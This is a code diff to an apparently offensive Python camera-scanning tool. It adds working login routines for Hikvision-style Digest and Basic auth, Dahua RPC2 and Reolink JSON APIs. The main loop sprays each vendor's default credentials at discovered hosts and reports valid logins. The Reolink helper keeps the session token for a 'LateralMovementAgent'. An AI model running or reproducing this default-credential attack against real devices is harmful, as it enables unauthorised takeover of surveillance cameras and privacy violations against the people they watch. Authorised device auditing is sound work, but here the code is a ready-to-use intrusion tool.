@@ -14,6 +14,7 @@ from core.vendors import (
     identify_device_type,
     get_rtsp_paths_for_vendor,
     get_http_paths_for_vendor,
+    get_credentials_for_vendor
 )
 
 def scan_network(network_range: str) -> list:
@@ -318,13 +319,13 @@ def check_rtsp(ip: str, port: int = 554, vendor: str = "generic_nvr") -> dict:
     """
 
     # Build deduplicated path list (vendor-specific first, generic fallback second)
-    # Using a set to track seen paths, list to preserve order
+    #using a set to track seen paths, list to preserve order, avoid duplicates
     vendor_paths = get_rtsp_paths_for_vendor(vendor)
     generic_paths = get_rtsp_paths_for_vendor("generic_nvr")
 
     seen = set()
     paths_to_try = []
-    for path in vendor_paths + generic_paths:
+    for path in vendor_paths + generic_paths: 
         if path not in seen:
             seen.add(path)
             paths_to_try.append(path)
@@ -371,8 +372,256 @@ def check_rtsp(ip: str, port: int = 554, vendor: str = "generic_nvr") -> dict:
         "stream_url": None
     }
 
+# ------------------ HELPER FUNCTIONS FOR TEST_CREDENTIALS() -------------------------------
+def _try_digest_auth(ip: str, path: str, username: str, password: str) -> dict | None:
+    """
+    Attempt HTTP Digest authentication against a specific endpoint.
+
+    In Digest_Auth function, the server sends a nonce, the client hashes credentials + nonce and sends back. 
+    More secure than Basic since credentials aren't sent in plaintext. Common on Hikvision, Axis, Hanwha.
+
+    Returns result dict on success, None on failure.
+    """
+    try:
+        url = f"http://{ip}{path}"
+        r = requests.get(
+            url,
+            auth=HTTPDigestAuth(username, password),
+            timeout=HTTP_TIMEOUT
+        )
+        if r.status_code == 200:
+            return {
+                "status": "success",
+                "auth_type": "digest",
+                "endpoint": path,
+                "access_level": "admin"
+            }
+    except requests.exceptions.RequestException:
+        pass
+    return None
+
+def _try_basic_auth(ip: str, path: str, username: str, password: str) -> dict | None:
+    """
+    Attempt HTTP Basic authentication against a specific endpoint.
+
+    Basic auth sends credentials as base64(username:password) in the Authorization header. 
+    Essentially plaintext, less secure than Digest, but still common on budget cameras and older firmware.
+
+    Returns result dict on success, None on failure.
+    """
+    try:
+        url = f"http://{ip}{path}"
+        r = requests.get(
+            url,
+            auth=HTTPBasicAuth(username, password),
+            timeout=HTTP_TIMEOUT
+        )
+        if r.status_code == 200:
+            return {
+                "status": "success",
+                "auth_type": "basic",
+                "endpoint": path,
+                "access_level": "admin"
+            }
+    except requests.exceptions.RequestException:
+        pass
+    return None
+
+def _try_dahua_rpc2_auth(ip: str, path: str, username: str, password: str) -> dict | None:
+    """
+    Attempt Dahua RPC2 JSON authentication.
+
+    Dahua (and Amcrest OEM) uses a proprietary JSON-RPC protocol instead of standard HTTP auth. 
+    Credentials go in the POST body, not the Authorization header. The response is JSON, check the 'result' 
+    field, not HTTP status.
+
+    HTTP 200 does NOT mean success, the server always returns 200, success/failure is indicated inside the 
+    JSON body.
+
+    Returns result dict on success, None on failure.
+    """
+    try:
+        url = f"http://{ip}{path}"
+        payload = {
+            "method": "global.login",
+            "params": {
+                "userName": username,
+                "password": password,
+                "clientType": "Web3.0"
+            },
+            "id": 1
+        }
+        r = requests.post(url, json=payload, timeout=HTTP_TIMEOUT)
+
+        if r.status_code == 200:
+            data = r.json()
+            # Dahua returns {"result": true} on success
+            # "result": false = wrong credentials
+            if data.get("result") is True:
+                return {
+                    "status": "success",
+                    "auth_type": "dahua_rpc2",
+                    "endpoint": path,
+                    "access_level": "admin"
+                }
+    except (requests.exceptions.RequestException, ValueError):
+        # ValueError catches JSON decode failures on malformed responses
+        pass
+    return None
+
+def _try_reolink_json_auth(ip: str, path: str, username: str, password: str) -> dict | None:
+    """
+    Attempt Reolink JSON API authentication.
+
+    Reolink uses a JSON array POST body — a list of command objects.
+    Unlike Dahua RPC2, the success check is 'rspCode': 200 inside the
+    response array, not a 'result' boolean.
+
+    Also unlike Dahua, a successful login returns a session token
+    that would be needed for subsequent API calls. We capture it here
+    for potential use by LateralMovementAgent.
+
+    Returns result dict on success, None on failure.
+    """
+    try:
+        url = f"http://{ip}{path}"
+        payload = [
+            {
+                "cmd": "Login",
+                "action": 0,
+                "param": {
+                    "User": {
+                        "userName": username,
+                        "password": password
+                    }
+                }
+            }
+        ]
+        r = requests.post(url, json=payload, timeout=HTTP_TIMEOUT)
+
+        if r.status_code == 200:
+            data = r.json()
+            # Reolink returns a list — check first item's rspCode
+            if isinstance(data, list) and len(data) > 0:
+                if data[0].get("code") == 0:
+                    # Extract session token for potential reuse
+                    token = data[0].get("value", {}).get("Token", {}).get("name", None)
+                    return {
+                        "status": "success",
+                        "auth_type": "reolink_json",
+                        "endpoint": path,
+                        "access_level": "admin",
+                        "token": token  # useful for LateralMovementAgent
+                    }
+    except (requests.exceptions.RequestException, ValueError): #catch any and all network failures (timeout, DNS, connection refused)
+        pass
+    return None
+# -------------------------------------------------------------------------------------------
+
 def test_credentials(ip: str, username: str, password: str, vendor: str = "generic_nvr") -> dict:
-    pass
+    """
+    Test a username/password pair against a host using vendor specific auth.
+
+    Strategy:
+        1. For each vendor-specific HTTP path, send an unauthenticated probe GET.
+        2. Read the WWW-Authenticate header to auto-detect HTTP auth type (Digest v Basic).
+        3. For JSON API vendors (Reolink/Dahua), route directly to vendor-specific helper.
+        4. Return immediately on first success — no point testing more paths.
+
+    Args:
+        ip:       Target IP address
+        username: Username to test
+        password: Password to test
+        vendor:   Vendor key from VENDOR_PROFILES determines paths and auth routing
+
+    Returns:
+        Dict with ip, username, password, status, access_level, endpoint, auth_type.
+        status is "success" or "failed".
+    """
+
+    paths = get_http_paths_for_vendor(vendor)
+
+    for path in paths:
+        try:
+            url = f"http://{ip}{path}"
+
+            # --- Step 1: Route JSON API vendors directly ---
+            # These vendors don't use WWW-Authenticate at all, auth is entirely inside the JSON body, 
+            # probing first would just return 200 with an error code
+            if vendor == "reolink":
+                result = _try_reolink_json_auth(ip, path, username, password)
+                if result:
+                    return {
+                        "ip": ip,
+                        "username": username,
+                        "password": password,
+                        **result
+                    }
+                continue #skip the remaining if/elifs if [reolink] worked
+
+            if vendor in ("dahua", "amcrest"):
+                result = _try_dahua_rpc2_auth(ip, path, username, password)
+                if result:
+                    return {
+                        "ip": ip,
+                        "username": username,
+                        "password": password,
+                        **result
+                    }
+                continue
+
+            # --- Step 2: Probe for HTTP auth type ---
+            # Send unauthenticated request, server tells us what it expects via WWW-Authenticate header. 
+            # This avoids guessing auth type
+            probe = requests.get(url, timeout=HTTP_TIMEOUT)
+
+            if probe.status_code == 401:
+                auth_header = probe.headers.get("WWW-Authenticate", "")
+
+                if "Digest" in auth_header:
+                    result = _try_digest_auth(ip, path, username, password)
+                elif "Basic" in auth_header:
+                    result = _try_basic_auth(ip, path, username, password)
+                else:
+                    # 401 but no recognizable auth scheme, try both
+                    result = _try_digest_auth(ip, path, username, password)
+                    if not result:
+                        result = _try_basic_auth(ip, path, username, password)
+
+            elif probe.status_code == 200:
+                # Some endpoints return 200 on unauthenticated requests but still enforce auth on 
+                # sensitive operations. Try both auth methods, if credentials are wrong, the response content 
+                # will differ from unauthenticated
+                result = _try_digest_auth(ip, path, username, password)
+                if not result:
+                    result = _try_basic_auth(ip, path, username, password)
+
+            else:
+                # 403, 404, 500 etc. this path isn't useful, try next
+                continue
+
+            if result:
+                return {
+                    "ip": ip,
+                    "username": username,
+                    "password": password,
+                    **result
+                }
+
+        except requests.exceptions.RequestException:
+            # Network error on this path, try next path
+            continue
+
+    # Nothing worked across all paths
+    return {
+        "ip": ip,
+        "username": username,
+        "password": password,
+        "status": "failed",
+        "access_level": None,
+        "endpoint": None,
+        "auth_type": None
+    }
 
 def capture_frame(): #openVC capture frame
     pass
@@ -407,6 +656,16 @@ if __name__ == "__main__":
                 print(rtsp_result)
         else:
             print(f"[check_rtsp] {host['ip']} — no RTSP ports open, skipping")
+
+        #step 4: test default_creds() 
+        
+        creds = get_credentials_for_vendor(vendor)
+        for username, password in creds:
+            result = test_credentials(host["ip"], username, password, vendor)
+            print(result)
+            if result["status"] == "success":
+                print(f"[!] VALID CREDENTIALS FOUND: {username}:{password} on {host['ip']}")
+                break  # stop testing once we have valid creds
 
     # Direct RTSP test against local mediamtx instance
     rtsp_result = check_rtsp("127.0.0.1", 8554, "generic_nvr")
